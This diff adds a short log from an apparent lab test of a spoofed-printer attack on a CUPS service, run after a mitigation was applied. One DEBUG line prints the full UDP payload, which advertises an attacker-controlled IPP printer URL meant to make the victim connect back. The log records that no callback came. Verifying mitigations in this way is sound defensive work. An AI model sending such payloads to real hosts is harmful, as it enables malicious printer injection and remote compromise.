@@ -1,0 +1,7 @@
+2026-11-15 13:49:46,475 INFO IPP callback listener up on 10.13.37.66:16320
+2026-11-15 13:49:46,775 INFO [basic] sending UDP 10.13.37.66:0 -> 10.13.37.10:631 (99 bytes) src_spoofed=False
+2026-11-15 13:49:46,776 DEBUG payload: b'0 3 ipp://10.13.37.66:16320/printers/AFTER-MITIGATION "Attacker Controlled" "Totally Legit Printer"'
+2026-11-15 13:49:46,829 INFO waiting up to 10s for the victim to connect back...
+2026-11-15 13:49:58,980 INFO wrote 1 packets to /lab/pcap_files/attack_variant1_basic_after_mitigation.pcap
+2026-11-15 13:49:58,980 INFO RESULT: no callback observed within 10s
+2026-11-15 13:49:58,981 INFO wrote run summary to /lab/evidence/attack_variant1_after_mitigation_summary.json
